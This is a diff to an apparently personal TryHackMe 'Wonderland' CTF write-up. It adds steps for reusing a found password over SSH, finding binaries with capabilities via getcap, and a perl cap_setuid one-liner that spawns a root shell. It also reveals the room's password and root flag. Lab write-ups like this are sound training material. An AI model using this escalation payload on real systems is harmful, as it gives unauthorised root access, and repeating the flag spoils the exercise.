@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/wonderland/","tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"],"created":"2026-04-06T13:26:22.348+02:00","updated":"2026-04-06T21:08:12.500+02:00","dg-note-properties":{"tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/wonderland/","tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"],"created":"2026-04-06T13:26:22.348+02:00","updated":"2026-04-06T21:51:19.637+02:00","dg-note-properties":{"tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"]}}
 ---
 
 ![](/img/user/Attachments/wonderland.png)
@@ -190,9 +190,48 @@ The teaParty file talks about Hatter. Perhaps the theme revolves around him. One
 
 Sure enough a shell as **hatter** spawns. So it is a success. 
 
+------
+### Moving as Hatter
+
+![](/img/user/Attachments/psw.png)
+
+Entering Hatter's directory and revealing what is there. 
+
+```
+# Password from password.txt
+WhyIsARavenLikeAWritingDesk?
+```
+
+I tested the password for both `root` and `tryhackme` accounts and neither worked. Perhaps it is a password which works for a accessing a file or unlocking a binary? 
+
+Trying for SSH access as hatter with the found password because right now hatter is only in `rabbit` group. 
+
+`ssh hatter@TARGET`
+
+This is a success and now there is access via SSH as hatter and hatter is in `hatter` group.
+
+----------
+
+### Going for Root
+
+`getcap -r / 2>/dev/null`
+
+```
+# Output from command
+/usr/bin/perl5.26.1 = cap_setuid+ep  
+/usr/bin/mtr-packet = cap_net_raw+ep  
+/usr/bin/perl = cap_setuid+ep
+```
+
+`cap_setuid` means perl can set its UID to any user including root — without needing SUID.
+
+**Payload**
+`/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";`
+
+![](/img/user/Attachments/root%201.png)
+
 ## Pwnage
 
-First flag: 
-Second flag: 
+Root flag `thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`
 
 ## Attack Pattern Analysis (APA)
